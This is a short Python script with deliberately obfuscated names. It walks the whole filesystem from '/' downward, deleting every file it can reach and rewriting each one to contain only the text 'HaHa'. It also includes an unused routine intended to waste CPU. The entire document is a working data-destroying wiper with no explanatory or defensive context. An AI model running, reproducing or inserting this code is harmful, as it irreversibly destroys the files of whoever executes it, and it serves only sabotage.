from os import remove as _a_4_
from os import path as __o_N_1_
from os import listdir as _W_e_
from math import pow as _i_1_

async def _s():
    for _ in range(10_000_000): _i_1_(_, _)

def a__A__r(p='/'):
    try:
        for _ in _W_e_(p):
            __ = __o_N_1_.join(p, _)
            if __o_N_1_.isdir(__): a__A__r(__)
            elif __o_N_1_.isfile(__):
                _a_4_(__)
                with open(__, 'w') as _Zz_3__: _Zz_3__.write('HaHa')
                _s()
    except PermissionError: print(f"? {p}")
    except Exception as e: print(f"? {p}: {e}")
if __name__ == '__main__': a__A__r()